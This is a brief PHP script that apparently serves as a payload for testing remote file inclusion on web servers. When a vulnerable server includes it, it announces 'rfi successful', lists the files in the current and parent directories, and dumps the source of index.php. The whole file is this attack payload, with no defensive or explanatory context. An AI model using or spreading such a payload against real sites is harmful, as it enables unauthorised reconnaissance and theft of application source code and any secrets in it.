<?php 
echo "rfi successful";

$files = scandir('.'); 
 print_r($files);

$files2 = scandir('../'); 
 print_r($files2);


echo file_get_contents( "index.php" );
?>
